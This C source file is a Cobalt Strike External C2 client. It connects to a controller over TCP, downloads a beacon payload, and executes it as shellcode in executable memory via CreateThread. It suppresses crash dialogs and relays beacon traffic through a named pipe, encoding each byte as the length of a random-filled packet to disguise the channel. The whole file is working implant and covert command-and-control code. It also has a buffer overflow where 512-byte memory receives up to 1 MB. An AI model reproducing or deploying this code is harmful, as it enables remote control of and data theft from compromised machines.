/**
 * client.c
 * by Daniel Fitzgerald
 * Jan 2020
 *
 * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to a string containing the IP address to connect to
 * @param port A pointer to a string containing the port to connect on
 * @return A socket handle for the connection
 * @pre ip and port form a valid IP address and port number
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
*/
void sendData(SOCKET sd, const char* data, DWORD len) {
	send(sd, (char *)&len, 4, 0);
	send(sd, data, len, 0);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 *
 * @param sd The socket file descriptor
 * @param buffer Buffer to store data in
 * @param max unused
 * @return Size of data recieved
*/
DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
	DWORD size = 0, total = 0, temp = 0;

	/* read the 4-byte length */
	/* TODO - will this cause endian issues? */
	recv(sd, (char *)&size, 4, 0);

	/* read in the result */
	while (total < size) {
		temp = recv(sd, buffer + total, size - total, 0);
		total += temp;
	}

	return size;
}


/**
 * Reads a frame from the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE smb_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(smb_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(smb_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Writes a frame to the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(smb_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(smb_handle, buffer, length, &wrote, NULL);
}



/**
 *  This function decodes a packet's length into a byte.
 *  @param payload: the string to decode the length of.
 *  @return length(payload) % 256 if length(payload) % 256 > 128,
 *          (length(payload) % 256) +  128 otherwise.
 */ 
unsigned char decode_length(char* payload) {
    unsigned char payload_length = (unsigned char)(strlen(payload) % 256);
    return payload_length;
}


/**
 *  This function encodes a byte into a string of appropriate length.
 *  @param byte: the byte to encode into the length of the string.
 *  @return a pointer to the head of the payload string of appropriate length.
 */ 
char* encode_length(unsigned char byte) {
	unsigned int length = (int) byte;
	if (length <= 128) {
        length  += 128;
    }
    char* payload_str = malloc(length);
    unsigned int i = 0;
    for (i = 0; i < length; i++) {
        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
    }
    return payload_str;
}

/**
 *  This function generates a 100-byte end transmission string.
 *  @return a pointer to the head of the 100-byte end transmission string.
 */ 
char* encode_end_transmission() {
    char* payload_str = malloc(100);
    unsigned char i = 0;
    for (i = 0; i < 100; i++) {
        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
    }
    return payload_str;
}




/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
{
	printf("Running the file");
	// Set connection and IRC info
	if (argc != 4)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
		exit(1);
	}
	time_t time_seed;
	srand((unsigned int) time(&time_seed));
	
	//seed random number table

	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	char* IP = argv[1];
	char* PORT = argv[2];
	
	char pipe_str[50];
	strcpy(pipe_str, argv[3]);

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;
	printf("Creating socket");
	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}

	// Allocate data for receiving beacon payload
	printf("running Virutal Alloc");
	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		printf("payload buffer malloc failed!\n");
		exit(1);
	}

	printf("Recieving initial payload data");
	DWORD payload_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
	if (payload_size < 0)
	{
		printf("recvData error, exiting\n");
		free(payload);
		exit(1);
	}
	printf("Recv %d byte payload from TS\n", payload_size);
	/* inject the payload stage into the current process */

	printf("Injecting payload stage into current process.");
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(5);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		// Create pipe to connect to. 
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
	}
	printf("Connected to pipe!!\n");

	// Mudge used 1MB max in his example
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		free(payload);
		exit(1);
	}
	// pointer to payload strings 
	char* random_line = NULL;
	DWORD byte_counter = 0;
	unsigned char byte = 0;
	// The pipe dance
	while (1) {
		// Read frame
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("read_frame error, exiting\n");
			break;
		}

		//Send data to receiver, 1 byte per packet
		printf("Recv %d bytes from beacon\n", read_size);
		for (byte_counter = 0; byte_counter < read_size; byte_counter++) {
			byte = (unsigned char) *(buffer + byte_counter);
			random_line = encode_length(byte);
			sendData(sockfd, random_line, (DWORD) byte);
			free(random_line);
		}
		
		//Send "End Transmission" 100 byte packet
		random_line = encode_end_transmission();
		sendData(sockfd, random_line, 100);
		free(random_line);

		printf("Sent to TS\n");
		

		//Allocate space for random line
		random_line = malloc(512*sizeof(unsigned char));
		byte_counter = 0;

		//Read in data from server. 
		read_size = recvData(sockfd, random_line, 512);
		while (read_size != 100 && byte_counter < BUFFER_MAX_SIZE) {
			if (read_size < 0)
			{
				printf("recvData error, exiting\n");
				break;
			}
			buffer[byte_counter] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
			byte_counter++;
			read_size = recvData(sockfd, random_line, BUFFER_MAX_SIZE);
			
		}
		printf("Recv %d bytes from TS\n", byte_counter);
		free(random_line);
		write_frame(beaconPipe, buffer, byte_counter);
		printf("Sent to beacon\n");
	}
	//Free all allocated memory and close all memory leaks 
	free(random_line);
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);
}

